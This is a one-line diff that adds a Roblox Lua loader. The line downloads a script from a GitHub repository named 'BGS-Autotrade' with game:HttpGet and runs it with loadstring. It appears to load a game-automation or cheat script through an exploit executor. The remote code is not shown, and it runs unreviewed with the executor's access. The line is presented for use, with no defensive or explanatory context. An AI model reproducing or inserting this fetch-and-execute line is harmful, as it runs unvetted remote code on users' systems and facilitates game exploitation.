@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vstaxds/BGS-Autotrade/main/testing_3031'))()
